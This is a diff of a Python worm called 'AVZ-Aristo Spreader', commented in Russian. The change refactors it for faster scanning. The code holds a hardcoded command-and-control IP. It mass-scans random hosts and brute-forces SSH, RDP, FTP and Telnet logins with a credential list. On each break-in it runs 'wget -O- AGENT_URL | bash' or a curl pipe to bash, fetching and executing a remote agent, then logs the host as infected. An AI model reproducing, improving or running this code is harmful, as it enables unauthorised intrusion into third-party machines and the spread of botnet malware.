@@ -1,18 +1,25 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.10.4 – AGENT_URL через порт 8080, детальные логи
-import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess
-import ipaddress, logging
-import resource
-resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
+# AVZ-Aristo Spreader v25.10.5 – быстрый скан, детальные логи, авто‑лимиты
+import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging
+
+# Автоматическое увеличение лимита открытых файлов (только на Linux)
+if sys.platform != 'win32':
+    import resource
+    try:
+        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
+    except:
+        pass
+
 logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 
 C2_HOST = "80.249.146.202"
-C2_PORT = 80                    # TCP для команд/регистрации
-API_PORT = 8080                 # HTTP API для скачивания агента
+C2_PORT = 80
+API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
 AGENT_PY_URL = f"http://{C2_HOST}:{API_PORT}/agent.py"
-MAX_CONCURRENT = 200
-TIMEOUT = 2.0
+MAX_CONCURRENT = 300          # уменьшено для стабильности
+QUICK_TIMEOUT = 0.5           # быстрый таймаут для портов
+BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 10_000
 PORT_LIST = [21, 22, 23, 80, 443, 2375, 3389, 6379, 8080, 9200]
 
@@ -45,65 +52,66 @@ def get_local_ips():
 
 async def probe_port(ip, port):
     try:
-        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=TIMEOUT)
+        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
         w.close(); await w.wait_closed()
         return True
     except:
         return False
 
 async def ssh_brute(ip):
-    """Пытается paramiko, asyncssh, sshpass"""
-    try:
-        import paramiko
-        for u, p in CREDS:
-            try:
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=2, auth_timeout=2, allow_agent=False, look_for_keys=False)
-                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
-                client.close()
-                return True
-            except Exception as e:
-                print(f"[!] SSH paramiko {ip}:{u}:{p} - {e}")
-                continue
-    except ImportError:
-        print("[!] paramiko not installed")
-    try:
-        import asyncssh
-        for u, p in CREDS:
-            try:
-                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
-                    await conn.run(f"wget -O- {AGENT_URL} | bash")
-                    return True
-            except Exception as e:
-                print(f"[!] SSH asyncssh {ip}:{u}:{p} - {e}")
-                continue
-    except ImportError:
-        print("[!] asyncssh not installed")
-    for u, p in CREDS:
-        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+    for method_name, method_func in [("paramiko", _ssh_paramiko), ("asyncssh", _ssh_asyncssh), ("sshpass", _ssh_sshpass)]:
         try:
-            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return True
+            if await method_func(ip):
+                return True
         except Exception as e:
-            print(f"[!] SSH sshpass {ip}:{u}:{p} - {e}")
+            print(f"[!] SSH {method_name} {ip} - {e}")
+    return False
+
+async def _ssh_paramiko(ip):
+    import paramiko
+    for u, p in CREDS:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(ip, username=u, password=p, timeout=2, banner_timeout=2, auth_timeout=2, allow_agent=False, look_for_keys=False)
+            client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
+            client.close()
+            return True
+        except:
+            continue
+    return False
+
+async def _ssh_asyncssh(ip):
+    import asyncssh
+    for u, p in CREDS:
+        try:
+            async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
+                await conn.run(f"wget -O- {AGENT_URL} | bash")
+                return True
+        except:
+            continue
+    return False
+
+async def _ssh_sshpass(ip):
+    for u, p in CREDS:
+        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+        try:
+            subprocess.run(cmd, shell=True, timeout=3, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        except:
+            continue
     return False
 
 async def rdp_brute(ip):
-    """RDP через xfreerdp (только Linux)"""
     if sys.platform != 'linux':
         return False
     for u, p in CREDS:
         cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
-        proc = await asyncio.create_subprocess_shell(
-            cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
-        )
+        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
         try:
             await asyncio.wait_for(proc.communicate(), timeout=3)
             if proc.returncode == 0:
-                await asyncio.create_subprocess_shell(
-                    f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'"
-                )
+                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
                 return True
         except Exception as e:
             print(f"[!] RDP {ip}:{u}:{p} - {e}")
@@ -113,7 +121,7 @@ async def ftp_brute(ip):
     for u, p in CREDS:
         try:
             ftp = ftplib.FTP()
-            ftp.connect(ip, 21, timeout=TIMEOUT)
+            ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
             ftp.login(u, p)
             with open("/tmp/agent.sh", "w") as f:
                 f.write(f"wget -O- {AGENT_URL} | bash")
@@ -125,7 +133,7 @@ async def ftp_brute(ip):
             print(f"[!] FTP {ip}:{u}:{p} - {e}")
     try:
         ftp = ftplib.FTP()
-        ftp.connect(ip, 21, timeout=TIMEOUT)
+        ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
         ftp.login()
         ftp.quit()
         return True
@@ -172,9 +180,7 @@ async def exploit_jenkins(ip):
 async def exploit_telnet(ip):
     for u, p in CREDS:
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, 23), timeout=TIMEOUT
-            )
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=BRUTE_TIMEOUT)
             try:
                 data = await asyncio.wait_for(reader.read(1024), timeout=1)
             except:
@@ -229,6 +235,7 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
+    # Векторы по приоритету
     if open_ports[2] and await ssh_brute(ip):
         print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
